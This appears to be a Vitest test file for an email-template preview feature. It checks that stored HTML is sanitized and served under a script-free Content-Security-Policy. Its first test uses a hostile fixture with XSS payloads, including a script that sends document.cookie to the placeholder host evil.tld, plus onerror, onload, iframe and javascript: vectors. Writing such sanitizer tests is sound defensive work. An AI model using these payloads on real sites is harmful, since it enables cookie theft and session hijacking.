import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { sanitizeEmailHtml } from '~/server/utils/html-sanitize'

// The preview route re-serves stored template HTML as a text/html document in
// our own origin. Legacy templates on disk predate input sanitizing, so the
// read path must neutralize a payload even when the file itself is hostile.
describe('template preview hardening', () => {
  it('neutralizes a hostile stored template on read', () => {
    const hostile = [
      '<!DOCTYPE html><html><body>',
      '<script>fetch("https://evil.tld/"+document.cookie)</script>',
      '<img src=x onerror="fetch(\'https://evil.tld\')">',
      '<iframe src="https://evil.tld"></iframe>',
      '<a href="javascript:alert(1)">click</a>',
      '<svg/onload=alert(1)>',
      '</body></html>',
    ].join('')

    const out = sanitizeEmailHtml(hostile)
    expect(out).not.toMatch(/<script/i)
    expect(out).not.toMatch(/onerror/i)
    expect(out).not.toMatch(/onload/i)
    expect(out).not.toMatch(/<iframe/i)
    expect(out).not.toMatch(/javascript:/i)
    expect(out).not.toMatch(/evil\.tld\/"\+document/)
  })

  it('declares a script-free CSP for previews', () => {
    const src = fs.readFileSync(
      path.resolve(process.cwd(), 'server/api/templates.ts'),
      'utf-8',
    )
    expect(src).toMatch(/PREVIEW_CSP/)
    expect(src).toMatch(/default-src 'none'/)
    // Both the stored-template and demo-fallback preview branches must set it.
    const occurrences = src.match(/Content-Security-Policy/g) ?? []
    expect(occurrences.length).toBeGreaterThanOrEqual(2)
  })

  it('sanitizes template content on write', () => {
    const src = fs.readFileSync(
      path.resolve(process.cwd(), 'server/api/templates.ts'),
      'utf-8',
    )
    expect(src).toMatch(/sanitizeEmailHtml\(content\)/)
  })
})
